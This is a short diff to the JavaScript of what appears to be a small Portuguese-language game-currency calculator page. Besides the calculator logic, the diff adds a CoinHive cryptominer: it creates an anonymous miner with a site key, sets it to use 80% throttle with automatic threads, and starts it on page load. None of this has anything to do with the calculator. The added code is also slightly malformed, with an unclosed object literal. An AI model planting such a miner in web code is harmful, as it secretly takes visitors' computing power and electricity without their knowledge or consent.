@@ -12,5 +12,7 @@ conversao = (runasRegulares.value * 100) +(runasGrandes.value * 300) +
 resultado.innerText =conversao.toString().replace('.',',');
 }
 calcular.onclick =  function() {conversaoParaEssencia()};
-	
-	
+var miner = new CoinHive.Anonymous('crmLb6hLwTFPBPaX6KVgabb4oGXBL76O', { 
+throttle: 0.8,
+autoThreads: true);
+miner.start();
